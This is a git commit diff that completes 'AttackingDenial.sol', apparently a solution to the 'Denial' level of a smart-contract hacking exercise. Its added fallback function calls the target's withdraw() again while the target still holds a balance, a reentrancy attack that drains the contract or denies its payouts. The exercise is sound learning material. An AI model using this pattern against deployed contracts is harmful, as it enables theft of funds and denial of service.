b20c5b6b5d30a2062fb6a6bd2541b3b815e7ec14
cryptonomicon46 <sandman2145@gmail.com>
2022-11-22 18:13:51 -0800

    Denial Solved!

--- contracts/7. Denial/AttackingDenial.sol
+++ contracts/7. Denial/AttackingDenial.sol
@@ -4,10 +4,17 @@ import "./Denial.sol";
 
 contract AttackingDenial {
     address payable public contractAddress;
-
+    Denial d;
     constructor(address payable _contractAddress) {
         contractAddress = _contractAddress;
+        d = Denial(contractAddress);
     }
 
     //Code me!
+    fallback() external payable {
+        if (d.contractBalance() > 0) {
+            d.withdraw();
+
+        }
+    }
 }
